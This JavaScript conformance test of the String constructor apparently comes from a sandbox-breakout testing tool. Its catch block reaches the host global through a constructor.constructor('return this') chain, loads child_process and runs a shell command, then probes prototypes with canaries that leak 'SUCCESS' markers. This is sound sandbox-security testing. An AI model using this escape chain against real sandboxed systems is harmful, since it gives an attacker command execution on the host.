try {
    var __constr = String.prototype.constructor;
    var __instance = new __constr('choosing one');
    if (__instance != 'choosing one') {
        $ERROR('#0: __constr = String.prototype.constructor; __instance = new __constr("choosing one"); __instance =="choosing one". Actual: __instance ==' + __instance);
    }
    if (__instance.constructor !== String) {
        $ERROR('#1: __constr = String.prototype.constructor; __instance = new __constr("choosing one"); __instance.constructor === String. Actual: __instance.constructor ===' + __instance.constructor);
    }
    if (!String.prototype.isPrototypeOf(__instance)) {
        $ERROR('#2: __constr = String.prototype.constructor; __instance = new __constr("choosing one"); String.prototype.isPrototypeOf(__instance) return true. Actual: ' + String.prototype.isPrototypeOf(__instance));
    }
    var __to_string_result = '[object ' + 'String' + ']';
    delete String.prototype.toString;
    if (__instance.toString() !== __to_string_result) {
        $ERROR('#3: __constr = String.prototype.constructor; __instance = new __constr("choosing one"); delete String.prototype.toString; __instance.toString() === __to_string_result. Actual: __instance.toString() ===' + __instance.toString() + ' __to_string_result ===' + __to_string_result);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}